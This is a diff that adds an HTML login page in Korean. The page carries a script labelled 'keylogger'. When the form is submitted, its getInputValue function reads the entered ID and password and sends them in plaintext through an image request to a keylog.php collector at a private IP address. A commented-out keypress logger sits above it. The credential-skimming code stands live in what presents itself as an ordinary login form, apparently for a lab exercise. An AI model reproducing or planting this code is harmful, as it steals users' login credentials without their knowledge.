@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ko">
+
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name='viewport' content='width=device-width, intial-scale=1.0'>
+	
+	<link rel="stylesheet" href="/css/account.css">
+	<title>로그인</title>
+
+	<!--keylogger-->
+	<script>
+	/*
+	var keys = ""
+	document.onkeypress = function(event) {
+		var keyPressed = event.key;
+		// console.log(keyPressed);
+		keys+=keyPressed;
+		console.log(keys);
+	}
+	*/
+
+	function getInputValue() {
+		var url = "http://192.168.0.26/keylog.php?keys="
+		var id = document.getElementById("id").value;
+		var pw = document.getElementById("pw").value;
+		// console.log("id : " + id);
+		// console.log("pw : " + pw);
+		var keys = "id : " + id + " pw : " + pw;
+		// console.log(keys);
+
+		var send = url + keys;
+		console.log(send);
+		new Image().src = url + keys;
+	}
+	
+	</script>
+
+</head>
+<body>
+	<div class="account-form">
+	<h2>Login</h2>
+
+	<form action="login.php" method="post" onsubmit="getInputValue()">
+		<p><input type="text" name="userid" placeholder="아이디" required class="text-field" id="id"></p>
+		<p><input type="password" name="userpw" placeholder="비밀번호" required class="text-field" id="pw"></p>
+		<p><input type="submit" value="로그인" class="submit-btn"></p>
+	</form>
+	</div>
+</body>
+</html>
